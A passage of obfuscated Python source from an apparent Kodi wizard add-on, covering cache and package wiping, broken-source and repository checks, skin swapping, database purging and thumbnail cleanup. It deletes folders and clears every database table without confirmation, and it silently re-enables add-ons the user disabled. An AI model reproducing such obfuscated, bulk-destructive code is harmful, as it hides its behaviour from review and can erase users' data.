                            log ("[COLOR white][Success] Wiped %s [/COLOR]"%os .path .join (OOO0OO000OO0O00O0 ,OO0OO00O00O0OOOOO ))#line:2509
                        except :#line:2510
                            log ("[COLOR red][Failed] To Wipe Cache In: %s [/COLOR]"%os .path .join (OOO0OO000OO0O00O0 ,OO0OO00O00O0OOOOO ))#line:2511
    LogNotify (ADDONTITLE ,'[COLOR white]Cache:[/COLOR] [COLOR red] %s Items Removed[/COLOR]'%O00O0O0O000OO0000 )#line:2513
origfolder =(xbmc .translatePath ("special://home/addons"))#line:2514
def CleanPYO ():#line:2515
    OOOO0O00O00OOOOOO =0 #line:2516
    for (OOOOO0O00O0OO0OOO ,OO00OOOOOO000000O ,O0O00O0O0OOOOOO00 )in os .walk (origfolder ):#line:2517
       for O000O00O0O0000O00 in O0O00O0O0OOOOOO00 :#line:2518
          if O000O00O0O0000O00 .endswith ('.pyo'):#line:2519
               os .remove (os .path .join (OOOOO0O00O0OO0OOO ,O000O00O0O0000O00 ))#line:2521
def fixwizard (over =None ):#line:2523
	OOO00OO00OOO0O000 =os .path .join (PROFILE ,'addon_data')#line:2525
	O0OO0O000OO0O0OO0 =[(OOO00OO00OOO0O000 ),(ADDONDATA ),os .path .join (xbmc .translatePath ('special://profile/addon_data/plugin.program.Anonymous'),'')]#line:2530
	O0OOO0O0OOO0OO00O =0 #line:2531
	O0O00OOOOO00O0O00 =['meta_cache','archive_cache']#line:2532
	for OOOO0OO00OOO0O000 in O0OO0O000OO0O0OO0 :#line:2533
		if os .path .exists (OOOO0OO00OOO0O000 )and not OOOO0OO00OOO0O000 in [ADDONDATA ,OOO00OO00OOO0O000 ]:#line:2534
			for O0O0OO0O00O0OO0O0 ,O0O0OO0O0OO0O0O0O ,O000O0O00OO000OOO in os .walk (OOOO0OO00OOO0O000 ):#line:2535
				O0O0OO0O0OO0O0O0O [:]=[O000O00O0OO0OOOO0 for O000O00O0OO0OOOO0 in O0O0OO0O0OO0O0O0O if O000O00O0OO0OOOO0 not in O0O00OOOOO00O0O00 ]#line:2536
				O000O00O000OO0O0O =0 #line:2537
				O000O00O000OO0O0O +=len (O000O0O00OO000OOO )#line:2538
				if O000O00O000OO0O0O >0 :#line:2539
					for O00O0O0O0OOOO000O in O000O0O00OO000OOO :#line:2540
						if not O00O0O0O0OOOO000O in LOGFILES :#line:2541
							try :#line:2542
								os .unlink (os .path .join (O0O0OO0O00O0OO0O0 ,O00O0O0O0OOOO000O ))#line:2543
								log ("[Wiped] %s"%os .path .join (O0O0OO0O00O0OO0O0 ,O00O0O0O0OOOO000O ),xbmc .LOGNOTICE )#line:2544
								O0OOO0O0OOO0OO00O +=1 #line:2545
							except :#line:2546
								pass #line:2547
						else :log ('Ignore Log File: %s'%O00O0O0O0OOOO000O ,xbmc .LOGNOTICE )#line:2548
					for O0O00OOO0O0000OO0 in O0O0OO0O0OO0O0O0O :#line:2549
						try :#line:2550
							shutil .rmtree (os .path .join (O0O0OO0O00O0OO0O0 ,O0O00OOO0O0000OO0 ))#line:2551
							O0OOO0O0OOO0OO00O +=1 #line:2552
							log ("[Success] cleared %s files from %s"%(str (O000O00O000OO0O0O ),os .path .join (OOOO0OO00OOO0O000 ,O0O00OOO0O0000OO0 )),xbmc .LOGNOTICE )#line:2553
						except :#line:2554
							log ("[Failed] to wipe cache in: %s"%os .path .join (OOOO0OO00OOO0O000 ,O0O00OOO0O0000OO0 ),xbmc .LOGNOTICE )#line:2555
		else :#line:2556
			for O0O0OO0O00O0OO0O0 ,O0O0OO0O0OO0O0O0O ,O000O0O00OO000OOO in os .walk (OOOO0OO00OOO0O000 ):#line:2557
				O0O0OO0O0OO0O0O0O [:]=[O00OO00O000O00O0O for O00OO00O000O00O0O in O0O0OO0O0OO0O0O0O if O00OO00O000O00O0O not in O0O00OOOOO00O0O00 ]#line:2558
				for O0O00OOO0O0000OO0 in O0O0OO0O0OO0O0O0O :#line:2559
					if not str (O0O00OOO0O0000OO0 .lower ()).find ('cache')==-1 :#line:2560
						try :#line:2561
							shutil .rmtree (os .path .join (O0O0OO0O00O0OO0O0 ,O0O00OOO0O0000OO0 ))#line:2562
							O0OOO0O0OOO0OO00O +=1 #line:2563
							log ("[Success] wiped %s "%os .path .join (O0O0OO0O00O0OO0O0 ,O0O00OOO0O0000OO0 ),xbmc .LOGNOTICE )#line:2564
						except :#line:2565
							log ("[Failed] to wipe cache in: %s"%os .path .join (OOOO0OO00OOO0O000 ,O0O00OOO0O0000OO0 ),xbmc .LOGNOTICE )#line:2566
	if os .path .exists (PACKAGES ):#line:2567
		try :#line:2568
			for O0O0OO0O00O0OO0O0 ,O0O0OO0O0OO0O0O0O ,O000O0O00OO000OOO in os .walk (PACKAGES ):#line:2569
				O000O00O000OO0O0O =0 #line:2570
				O000O00O000OO0O0O +=len (O000O0O00OO000OOO )#line:2571
				if O000O00O000OO0O0O >0 :#line:2572
					O0O0O0O0O0000O000 =convertSize (getSize (PACKAGES ))#line:2573
					if over :O000O000OO000OO00 =1 #line:2574
					else :O000O000OO000OO00 =1 #line:2575
					if O000O000OO000OO00 :#line:2576
						for O00O0O0O0OOOO000O in O000O0O00OO000OOO :os .unlink (os .path .join (O0O0OO0O00O0OO0O0 ,O00O0O0O0OOOO000O ))#line:2577
						for O0O00OOO0O0000OO0 in O0O0OO0O0OO0O0O0O :shutil .rmtree (os .path .join (O0O0OO0O00O0OO0O0 ,O0O00OOO0O0000OO0 ))#line:2578
						LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Success![/COLOR]'%COLOR2 )#line:2579
		except Exception as O0O00000O00O0OO00 :#line:2581
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: Error![/COLOR]'%COLOR2 )#line:2582
			log ("Clear Packages Error: %s"%str (O0O00000O00O0OO00 ),xbmc .LOGERROR )#line:2583
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Packages: None Found![/COLOR]'%COLOR2 )#line:2584
	LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]איפוס עבר בהצלחה %s Files[/COLOR]'%(COLOR2 ,O0OOO0O0OOO0OO00O ))#line:2586
def checkSources ():#line:2588
	if not os .path .exists (SOURCES ):#line:2589
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Sources.xml File Found![/COLOR]"%COLOR2 )#line:2590
		return False #line:2591
	OO000OOOO00OO00O0 =0 #line:2592
	O0OO0O000OOOOO0O0 =[]#line:2593
	O0OOO00O00O0O000O =[]#line:2594
	OOO00O0O0O0O0O00O =open (SOURCES )#line:2595
	O0O00000OO0OOO0O0 =OOO00O0O0O0O0O00O .read ()#line:2596
	OO0OO0O0OO0O00OOO =O0O00000OO0OOO0O0 .replace ('\r','').replace ('\n','').replace ('\t','')#line:2597
	OOOOOOOO0O0O0O0OO =re .compile ('<files>.+?</files>').findall (OO0OO0O0OO0O00OOO )#line:2598
	OOO00O0O0O0O0O00O .close ()#line:2599
	if len (OOOOOOOO0O0O0O0OO )>0 :#line:2600
		OOO0O00O000000O0O =re .compile ('<source>.+?<name>(.+?)</name>.+?<path pathversion="1">(.+?)</path>.+?<allowsharing>(.+?)</allowsharing>.+?</source>').findall (OOOOOOOO0O0O0O0OO [0 ])#line:2601
		DP .create (ADDONTITLE ,"[COLOR %s]Scanning Sources for Broken links[/COLOR]"%COLOR2 )#line:2602
		for O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O in OOO0O00O000000O0O :#line:2603
			OO000OOOO00OO00O0 +=1 #line:2604
			O0OOO0O0OOO00O000 =int (percentage (OO000OOOO00OO00O0 ,len (OOO0O00O000000O0O )))#line:2605
			DP .update (O0OOO0O0OOO00O000 ,'',"[COLOR %s]Checking [COLOR %s]%s[/COLOR]:[/COLOR]"%(COLOR2 ,COLOR1 ,O0O0O0OO000OOO0OO ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O0OOO0O0OO0 ))#line:2606
			if 'http'in OOO000O0OOO0O0OO0 :#line:2607
				OO00O00OOO000OOO0 =workingURL (OOO000O0OOO0O0OO0 )#line:2608
				if not OO00O00OOO000OOO0 ==True :#line:2609
					O0OO0O000OOOOO0O0 .append ([O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O ,OO00O00OOO000OOO0 ])#line:2610
		log ("Bad Sources: %s"%len (O0OO0O000OOOOO0O0 ),xbmc .LOGNOTICE )#line:2612
		if len (O0OO0O000OOOOO0O0 )>0 :#line:2613
			O00OOOOOOOO0OO0O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] Source(s) have been found Broken"%(COLOR1 ,len (O0OO0O000OOOOO0O0 ),COLOR2 ),"Would you like to Remove all or choose one by one?[/COLOR]",yeslabel ="[B][COLOR green]Remove All[/COLOR][/B]",nolabel ="[B][COLOR red]Choose to Delete[/COLOR][/B]")#line:2614
			if O00OOOOOOOO0OO0O0 ==1 :#line:2615
				O0OOO00O00O0O000O =O0OO0O000OOOOO0O0 #line:2616
			else :#line:2617
				for O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O ,OO00O00OOO000OOO0 in O0OO0O000OOOOO0O0 :#line:2618
					log ("%s sources: %s, %s"%(O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,OO00O00OOO000OOO0 ),xbmc .LOGNOTICE )#line:2619
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] was reported as non working"%(COLOR1 ,O0O0O0OO000OOO0OO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000O0OOO0O0OO0 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O00OOO000OOO0 ),yeslabel ="[B][COLOR green]Remove Source[/COLOR][/B]",nolabel ="[B][COLOR red]Keep Source[/COLOR][/B]"):#line:2620
						O0OOO00O00O0O000O .append ([O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O ,OO00O00OOO000OOO0 ])#line:2621
						log ("Removing Source %s"%O0O0O0OO000OOO0OO ,xbmc .LOGNOTICE )#line:2622
					else :log ("Source %s was not removed"%O0O0O0OO000OOO0OO ,xbmc .LOGNOTICE )#line:2623
			if len (O0OOO00O00O0O000O )>0 :#line:2624
				for O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O ,OO00O00OOO000OOO0 in O0OOO00O00O0O000O :#line:2625
					O0O00000OO0OOO0O0 =O0O00000OO0OOO0O0 .replace ('\n        <source>\n            <name>%s</name>\n            <path pathversion="1">%s</path>\n            <allowsharing>%s</allowsharing>\n        </source>'%(O0O0O0OO000OOO0OO ,OOO000O0OOO0O0OO0 ,O0O0O000OO0O0O00O ),'')#line:2626
					log ("Removing Source %s"%O0O0O0OO000OOO0OO ,xbmc .LOGNOTICE )#line:2627
				OOO00O0O0O0O0O00O =open (SOURCES ,mode ='w')#line:2629
				OOO00O0O0O0O0O00O .write (str (O0O00000OO0OOO0O0 ))#line:2630
				OOO00O0O0O0O0O00O .close ()#line:2631
				O000O0OOOO0OOO0OO =len (OOOOOOOO0O0O0O0OO )-len (O0OO0O000OOOOO0O0 )#line:2632
				OOOOO0O00OOO000OO =len (O0OO0O000OOOOO0O0 )-len (O0OOO00O00O0O000O )#line:2633
				OOO000OOO0OOOO000 =len (O0OOO00O00O0O000O )#line:2634
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Checking sources for broken paths has been completed"%COLOR2 ,"Working: [COLOR %s]%s[/COLOR] | Kept: [COLOR %s]%s[/COLOR] | Removed: [COLOR %s]%s[/COLOR][/COLOR]"%(COLOR2 ,COLOR1 ,O000O0OOOO0OOO0OO ,COLOR1 ,OOOOO0O00OOO000OO ,COLOR1 ,OOO000OOO0OOOO000 ))#line:2635
			else :log ("No Bad Sources to be removed.",xbmc .LOGNOTICE )#line:2636
		else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Sources Are Working[/COLOR]"%COLOR2 )#line:2637
	else :log ("No Sources Found",xbmc .LOGNOTICE )#line:2638
def checkRepos ():#line:2640
	DP .create (ADDONTITLE ,'[COLOR %s]Checking Repositories...[/COLOR]'%COLOR2 )#line:2641
	OO0OO00000O000O00 =[]#line:2642
	ebi ('UpdateAddonRepos')#line:2643
	O0OOO000O00O00000 =glob .glob (os .path .join (ADDONS ,'repo*'))#line:2644
	if len (O0OOO000O00O00000 )==0 :#line:2645
		DP .close ()#line:2646
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Repositories Found![/COLOR]"%COLOR2 )#line:2647
		return #line:2648
	OO0O0O0OOOO0OO0O0 =len (O0OOO000O00O00000 );OO000O00O0O00OO00 =0 ;#line:2649
	while OO000O00O0O00OO00 <OO0O0O0OOOO0OO0O0 :#line:2650
		OO000O00O0O00OO00 +=1 #line:2651
		if DP .iscanceled ():break #line:2652
		OOO000OO0OO0O0O00 =int (percentage (OO000O00O0O00OO00 ,OO0O0O0OOOO0OO0O0 ))#line:2653
		DP .update (OOO000OO0OO0O0O00 ,'','[COLOR %s]Checking: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000O00O00000 [OO000O00O0O00OO00 -1 ].replace (ADDONS ,'')[1 :]))#line:2654
		xbmc .sleep (1000 )#line:2655
	if DP .iscanceled ():#line:2656
		DP .close ()#line:2657
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled[/COLOR]"%COLOR2 )#line:2658
		sys .exit ()#line:2659
	DP .close ()#line:2660
	O0000OOOO0O00OO0O =Grab_Log (False )#line:2661
	O0O00OO000O0OOO00 =re .compile ('CRepositoryUpdateJob(.+?)failed').findall (O0000OOOO0O00OO0O )#line:2662
	for O00OO00OOOOOO000O in O0O00OO000O0OOO00 :#line:2663
		log ("Bad Repository: %s "%O00OO00OOOOOO000O ,xbmc .LOGNOTICE )#line:2664
		O0OO0OO0O0OOOOOO0 =O00OO00OOOOOO000O .replace ('[','').replace (']','').replace (' ','').replace ('/','').replace ('\\','')#line:2665
		if not O0OO0OO0O0OOOOOO0 in OO0OO00000O000O00 :#line:2666
			OO0OO00000O000O00 .append (O0OO0OO0O0OOOOOO0 )#line:2667
	if len (OO0OO00000O000O00 )>0 :#line:2668
		OOO0OO0O0OOO0OOO0 ="[COLOR %s]Below is a list of Repositories that did not resolve.  This does not mean that they are Depreciated, sometimes hosts go down for a short period of time.  Please do serveral scans of your repository list before removing a repository just to make sure it is broken.[/COLOR][CR][CR][COLOR %s]"%(COLOR2 ,COLOR1 )#line:2669
		OOO0OO0O0OOO0OOO0 +='[CR]'.join (OO0OO00000O000O00 )#line:2670
		OOO0OO0O0OOO0OOO0 +='[/COLOR]'#line:2671
		TextBox ("%s: Bad Repositories"%ADDONTITLE ,OOO0OO0O0OOO0OOO0 )#line:2672
	else :#line:2673
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]All Repositories Working![/COLOR]"%COLOR2 )#line:2674
def killxbmc (over =None ):#line:2680
		log ("Force Closing Kodi: Platform[%s]"%str (platform ()),xbmc .LOGNOTICE )#line:2681
		os ._exit (1 )#line:2682
def redoThumbs ():#line:2684
	if not os .path .exists (THUMBS ):os .makedirs (THUMBS )#line:2685
	O0O00O0OOOO000O0O ='0123456789abcdef'#line:2686
	O0O000000O0000O0O =os .path .join (THUMBS ,'Video','Bookmarks')#line:2687
	for OOOO0O0O000O00OOO in O0O00O0OOOO000O0O :#line:2688
		O0OO0OOOOOOO0OO00 =os .path .join (THUMBS ,OOOO0O0O000O00OOO )#line:2689
		if not os .path .exists (O0OO0OOOOOOO0OO00 ):os .makedirs (O0OO0OOOOOOO0OO00 )#line:2690
	if not os .path .exists (O0O000000O0000O0O ):os .makedirs (O0O000000O0000O0O )#line:2691
def reloadFix (default =None ):#line:2693
	DIALOG .ok (ADDONTITLE ,"[COLOR %s]WARNING: Sometimes Reloading the Profile causes Kodi to crash.  While Kodi is Reloading the Profile Please Do Not Press Any Buttons![/COLOR]"%COLOR2 )#line:2694
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2695
	if default ==None :#line:2696
		lookandFeelData ('save')#line:2697
	redoThumbs ()#line:2698
	ebi ('ActivateWindow(Home)')#line:2699
	xbmc .sleep (10000 )#line:2701
	if KODIV >=17 :kodi17Fix ()#line:2702
	if default ==None :#line:2703
		log ("Switching to: %s"%getS ('defaultskin'))#line:2704
		O0000OOO00OO00000 =getS ('defaultskin')#line:2705
		skinSwitch .swapSkins (O0000OOO00OO00000 )#line:2706
		O0O00000OO0O000OO =0 #line:2707
		while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00000OO0O000OO <150 :#line:2708
			O0O00000OO0O000OO +=1 #line:2709
			xbmc .sleep (200 )#line:2710
		if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:2711
			ebi ('SendClick(11)')#line:2712
		lookandFeelData ('restore')#line:2713
	addonUpdates ('reset')#line:2714
	forceUpdate ()#line:2715
	ebi ("ReloadSkin()")#line:2716
def skinToDefault ():#line:2718
	if not currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary']:#line:2719
		O000OOO0OO0O0OO0O ='skin.confluence'if KODIV <17 else 'skin.estuary'#line:2720
	swapSkins (O000OOO0OO0O0OO0O )#line:2721
def swapSkins (O0OO00OO0O000O0O0 ):#line:2723
	skinSwitch .swapSkins (O0OO00OO0O000O0O0 )#line:2724
	O0O0OOOOOOO000O0O =0 #line:2725
	xbmc .sleep (1000 )#line:2726
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O0OOOOOOO000O0O <150 :#line:2727
		O0O0OOOOOOO000O0O +=1 #line:2728
		xbmc .sleep (100 )#line:2729
		ebi ('SendAction(Select)')#line:2730
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:2732
		ebi ('SendClick(11)')#line:2733
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Fresh Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:2734
	xbmc .sleep (500 )#line:2735
def mediaCenter ():#line:2737
	if str (HOME ).lower ().find ('kodi'):#line:2738
		return 'Kodi'#line:2739
	elif str (HOME ).lower ().find ('spmc'):#line:2740
		return 'SPMC'#line:2741
	else :#line:2742
		return 'Unknown Fork'#line:2743
def kodi17Fix ():#line:2745
	OO0O0OOO0O00OOO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2746
	OO0O0O0000OOOOOOO =[]#line:2747
	for OO0OOOOOOOO0O00O0 in sorted (OO0O0OOO0O00OOO0O ,key =lambda OO0000O0O000OO0O0 :OO0000O0O000OO0O0 ):#line:2748
		O00O000OO000OO00O =os .path .join (OO0OOOOOOOO0O00O0 ,'addon.xml')#line:2749
		if os .path .exists (O00O000OO000OO00O ):#line:2750
			OO0OOOO00OOOO00O0 =OO0OOOOOOOO0O00O0 .replace (ADDONS ,'')[1 :-1 ]#line:2751
			OOO000O0OO0OOOO00 =open (O00O000OO000OO00O )#line:2752
			OO00O0O0OO00OOO0O =OOO000O0OO0OOOO00 .read ()#line:2753
			OOOO0O000O00OOOOO =parseDOM (OO00O0O0OO00OOO0O ,'addon',ret ='id')#line:2754
			OOO000O0OO0OOOO00 .close ()#line:2755
			try :#line:2756
				OO00OO00OO00O0O0O =xbmcaddon .Addon (id =OOOO0O000O00OOOOO [0 ])#line:2757
			except :#line:2758
				try :#line:2759
					log ("%s was disabled"%OOOO0O000O00OOOOO [0 ],xbmc .LOGDEBUG )#line:2760
					OO0O0O0000OOOOOOO .append (OOOO0O000O00OOOOO [0 ])#line:2761
				except :#line:2762
					try :#line:2763
						log ("%s was disabled"%OO0OOOO00OOOO00O0 ,xbmc .LOGDEBUG )#line:2764
						OO0O0O0000OOOOOOO .append (OO0OOOO00OOOO00O0 )#line:2765
					except :#line:2766
						if len (OOOO0O000O00OOOOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO0OOOO00OOOO00O0 ,xbmc .LOGERROR )#line:2767
						else :log ("Unabled to enable: %s"%OO0OOOOOOOO0O00O0 ,xbmc .LOGERROR )#line:2768
	if len (OO0O0O0000OOOOOOO )>0 :#line:2769
		O00O0OOO00O0OOOO0 =0 #line:2770
		DP .create (ADDONTITLE ,'[COLOR %s]מעדכן הרחבות'%COLOR2 ,'','אנא המתן[/COLOR]')#line:2771
		for OOO00OO0OOO000O00 in OO0O0O0000OOOOOOO :#line:2772
			O00O0OOO00O0OOOO0 +=1 #line:2773
			OO0O0O000O0O00OO0 =int (percentage (O00O0OOO00O0OOOO0 ,len (OO0O0O0000OOOOOOO )))#line:2774
			DP .update (OO0O0O000O0O00OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OO0OOO000O00 ))#line:2775
			addonDatabase (OOO00OO0OOO000O00 ,1 )#line:2776
			if DP .iscanceled ():break #line:2777
		if DP .iscanceled ():#line:2778
			DP .close ()#line:2779
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:2780
			sys .exit ()#line:2781
		DP .close ()#line:2782
	forceUpdate ()#line:2783
def addonDatabase (addon =None ,state =1 ):#line:2786
	O0O0OO0OOO000OOO0 =latestDB ('Addons')#line:2787
	O0O0OO0OOO000OOO0 =os .path .join (DATABASE ,O0O0OO0OOO000OOO0 )#line:2788
	OO0O0OOOO0OOO0O0O =str (datetime .now ())[:-7 ]#line:2789
	if os .path .exists (O0O0OO0OOO000OOO0 ):#line:2790
		try :#line:2791
			O000OOOOOO0OO00O0 =database .connect (O0O0OO0OOO000OOO0 )#line:2792
			O00OO00OOO0OO0O0O =O000OOOOOO0OO00O0 .cursor ()#line:2793
		except Exception as OO00000O0O0O0OO00 :#line:2794
			log ("DB Connection Error: %s"%str (OO00000O0O0O0OO00 ),xbmc .LOGERROR )#line:2795
			return False #line:2796
	else :return False #line:2797
	if state ==2 :#line:2798
		try :#line:2799
			O00OO00OOO0OO0O0O .execute ("DELETE FROM installed WHERE addonID = ?",(addon ,))#line:2800
			O000OOOOOO0OO00O0 .commit ()#line:2801
			O00OO00OOO0OO0O0O .close ()#line:2802
		except Exception as OO00000O0O0O0OO00 :#line:2803
			log ("Error Removing %s from DB"%addon )#line:2804
		return True #line:2805
	try :#line:2806
		O00OO00OOO0OO0O0O .execute ("SELECT id, addonID, enabled FROM installed WHERE addonID = ?",(addon ,))#line:2807
		OO00O0OOO0000O00O =O00OO00OOO0OO0O0O .fetchone ()#line:2808
		if OO00O0OOO0000O00O ==None :#line:2809
			O00OO00OOO0OO0O0O .execute ('INSERT INTO installed (addonID , enabled, installDate) VALUES (?,?,?)',(addon ,state ,OO0O0OOOO0OOO0O0O ,))#line:2810
			log ("Insert %s into db"%addon )#line:2811
		else :#line:2812
			O000OOO0OOOO000OO ,O0OOO00O0O000O0O0 ,O0OO0OOOOOO0OO0O0 =OO00O0OOO0000O00O #line:2813
			O00OO00OOO0OO0O0O .execute ('UPDATE installed SET enabled = ? WHERE id = ? ',(state ,O000OOO0OOOO000OO ,))#line:2814
			log ("Updated %s in db"%addon )#line:2815
		O000OOOOOO0OO00O0 .commit ()#line:2816
		O00OO00OOO0OO0O0O .close ()#line:2817
	except Exception as OO00000O0O0O0OO00 :#line:2818
		log ("Erroring enabling addon: %s"%addon )#line:2819
def purgeDb (O00O0OO0OOO0O000O ):#line:2824
	log ('Purging DB %s.'%O00O0OO0OOO0O000O ,xbmc .LOGNOTICE )#line:2828
	if os .path .exists (O00O0OO0OOO0O000O ):#line:2829
		try :#line:2830
			OO00OO0000O00O000 =database .connect (O00O0OO0OOO0O000O )#line:2831
			OOO0O000OO0OO000O =OO00OO0000O00O000 .cursor ()#line:2832
		except Exception as OO00000000O00O00O :#line:2833
			log ("DB Connection Error: %s"%str (OO00000000O00O00O ),xbmc .LOGERROR )#line:2834
			return False #line:2835
	else :log ('%s not found.'%O00O0OO0OOO0O000O ,xbmc .LOGERROR );return False #line:2836
	OOO0O000OO0OO000O .execute ("SELECT name FROM sqlite_master WHERE type = 'table'")#line:2837
	for O00OOO0O0OO00O0OO in OOO0O000OO0OO000O .fetchall ():#line:2838
		if O00OOO0O0OO00O0OO [0 ]=='version':#line:2839
			log ('Data from table `%s` skipped.'%O00OOO0O0OO00O0OO [0 ],xbmc .LOGDEBUG )#line:2840
		else :#line:2841
			try :#line:2842
				OOO0O000OO0OO000O .execute ("DELETE FROM %s"%O00OOO0O0OO00O0OO [0 ])#line:2843
				OO00OO0000O00O000 .commit ()#line:2844
				log ('Data from table `%s` cleared.'%O00OOO0O0OO00O0OO [0 ],xbmc .LOGDEBUG )#line:2845
			except Exception as OO00000000O00O00O :log ("DB Remove Table `%s` Error: %s"%(O00OOO0O0OO00O0OO [0 ],str (OO00000000O00O00O )),xbmc .LOGERROR )#line:2846
	OOO0O000OO0OO000O .close ()#line:2847
	log ('%s DB Purging Complete.'%O00O0OO0OOO0O000O ,xbmc .LOGNOTICE )#line:2848
	OOO0O000O00O000OO =O00O0OO0OOO0O000O .replace ('\\','/').split ('/')#line:2849
	LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]%s Complete[/COLOR]"%(COLOR2 ,OOO0O000O00O000OO [len (OOO0O000O00O000OO )-1 ]))#line:2850
def oldThumbs ():#line:2852
	O00OO0O00O0O00OO0 =os .path .join (DATABASE ,latestDB ('Textures'))#line:2853
	OO0OOOO00000O00O0 =10 #line:2854
	O0OO0000O00O00OO0 =TODAY -timedelta (days =7 )#line:2855
	O0O0OO0O0O0OO00OO =[]#line:2856
	OOO0000000OOOO000 =[]#line:2857
	O0OOOOO00OO0OOOOO =0 #line:2858
	if os .path .exists (O00OO0O00O0O00OO0 ):#line:2859
		try :#line:2860
			O0OO00OOO0O0OO0OO =database .connect (O00OO0O00O0O00OO0 )#line:2861
			OOOOOO000O0000O0O =O0OO00OOO0O0OO0OO .cursor ()#line:2862
		except Exception as OOOO0OOOOOO00O0OO :#line:2863
			log ("DB Connection Error: %s"%str (OOOO0OOOOOO00O0OO ),xbmc .LOGERROR )#line:2864
			return False #line:2865
	else :log ('%s not found.'%O00OO0O00O0O00OO0 ,xbmc .LOGERROR );return False #line:2866
	OOOOOO000O0000O0O .execute ("SELECT idtexture FROM sizes WHERE usecount < ? AND lastusetime < ?",(OO0OOOO00000O00O0 ,str (O0OO0000O00O00OO0 )))#line:2867
	OO000O000OO00OO0O =OOOOOO000O0000O0O .fetchall ()#line:2868
	for OO000O00OOOOO0O0O in OO000O000OO00OO0O :#line:2869
		O0OOO000O00OOO00O =OO000O00OOOOO0O0O [0 ]#line:2870
		O0O0OO0O0O0OO00OO .append (O0OOO000O00OOO00O )#line:2871
		OOOOOO000O0000O0O .execute ("SELECT cachedurl FROM texture WHERE id = ?",(O0OOO000O00OOO00O ,))#line:2872
		OOOO0OOO000000O00 =OOOOOO000O0000O0O .fetchall ()#line:2873
		for OO00OOO0O0O00OO0O in OOOO0OOO000000O00 :#line:2874
			OOO0000000OOOO000 .append (OO00OOO0O0O00OO0O [0 ])#line:2875
	log ("%s total thumbs cleaned up."%str (len (OOO0000000OOOO000 )),xbmc .LOGNOTICE )#line:2876
	for OO0O00O0OOOO00OO0 in O0O0OO0O0O0OO00OO :#line:2877
		OOOOOO000O0000O0O .execute ("DELETE FROM sizes   WHERE idtexture = ?",(OO0O00O0OOOO00OO0 ,))#line:2878
		OOOOOO000O0000O0O .execute ("DELETE FROM texture WHERE id        = ?",(OO0O00O0OOOO00OO0 ,))#line:2879
	OOOOOO000O0000O0O .execute ("VACUUM")#line:2880
	O0OO00OOO0O0OO0OO .commit ()#line:2881
	OOOOOO000O0000O0O .close ()#line:2882
	for OOOO00000O0O00O0O in OOO0000000OOOO000 :#line:2883
		OOOO0O0000OOOO00O =os .path .join (THUMBS ,OOOO00000O0O00O0O )#line:2884
		try :#line:2885
			OO000O0OOO0O00OOO =os .path .getsize (OOOO0O0000OOOO00O )#line:2886
			os .remove (OOOO0O0000OOOO00O )#line:2887
			O0OOOOO00OO0OOOOO +=OO000O0OOO0O00OOO #line:2888
		except :#line:2889
			pass #line:2890
	O0OO00OOOO0O00OOO =convertSize (O0OOOOO00OO0OOOOO )#line:2891
	if len (OOO0000000OOOO000 )>0 :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: %s Files / %s MB[/COLOR]!'%(COLOR2 ,str (len (OOO0000000OOOO000 )),O0OO00OOOO0O00OOO ))#line:2892
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Clear Thumbs: None Found![/COLOR]'%COLOR2 )#line:2893
def parseDOM (O000O0OO0O000O000 ,name =u"",attrs ={},ret =False ):#line:2895
    if isinstance (O000O0OO0O000O000 ,str ):#line:2898
        try :#line:2899
            O000O0OO0O000O000 =[O000O0OO0O000O000 .decode ("utf-8")]#line:2900
